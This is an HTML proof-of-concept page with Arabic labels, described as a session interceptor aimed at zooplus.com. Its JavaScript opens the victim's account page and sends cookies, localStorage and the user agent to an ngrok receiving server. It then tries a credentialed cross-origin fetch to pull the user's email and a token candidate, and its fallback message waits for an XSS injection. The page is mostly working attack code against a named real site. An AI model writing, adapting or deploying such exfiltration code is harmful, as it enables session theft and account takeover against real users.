<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>PoC - Session & Token Exfiltration</title>
    <style>
        body { background: #121212; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .console { background: #000; border: 1px dashed #0f0; padding: 20px; text-align: left; display: inline-block; width: 80%; }
        .stolen { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>
    <div class="console">
        <h2>[+] نظام اعتراض الجلسات (Session Interceptor)</h2>
        <p>> مستهدف: zooplus.com</p>
        <p>> سيرفر الاستقبال: https://subsphenoidal-dauntlessly-pura.ngrok-free.dev</p>
        <hr>
        <button onclick="launchAndExfiltrate()" style="padding:10px; cursor:pointer;">ابدأ الهجوم وسحب البيانات</button>
        <div id="status"></div>
    </div>

    <script>
        const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';

        async function launchAndExfiltrate() {
            document.getElementById('status').innerHTML += "<p>> فتح نافذة الضحية...</p>";
            
            // 1. فتح نافذة الموقع المستهدف
            const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');

            // 2. إرسال البيانات المتوفرة حالياً (LocalStorage/Cookies)
            // ملاحظة: هذه البيانات ستكون خاصة بنطاق المهاجم ما لم يتم الحقن
            const initialLoot = {
                type: "INITIAL_PHASE",
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                userAgent: navigator.userAgent
            };

            // إرسال عبر Beacon (أكثر استقراراً وتخطياً للقيود)
            navigator.sendBeacon(NGROK_URL, JSON.stringify(initialLoot));

            document.getElementById('status').innerHTML += "<p class='stolen'>> [!] تم إرسال ملفات الكوكيز الأولية إلى Ngrok.</p>";

            // 3. محاولة سحب الـ JWT عبر طلب CORS (في حال وجود الضعف الذي افترضناه)
            try {
                const response = await fetch('https://www.zooplus.com/account/overview', {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'include'
                });
                const data = await response.json();
                
                navigator.sendBeacon(NGROK_URL, JSON.stringify({
                    type: "CORS_BYPASS_SUCCESS",
                    email: data.email,
                    jwt_candidate: data
                }));
                document.getElementById('status').innerHTML += "<p class='stolen'>> [!!!] نجاح اختراق CORS وسحب البيانات الحساسة!</p>";
            } catch (err) {
                document.getElementById('status').innerHTML += "<p>> [X] CORS محمي. بانتظار تفعيل سكريبت الحقن (XSS)...</p>";
            }
        }
    </script>
</body>
</html>
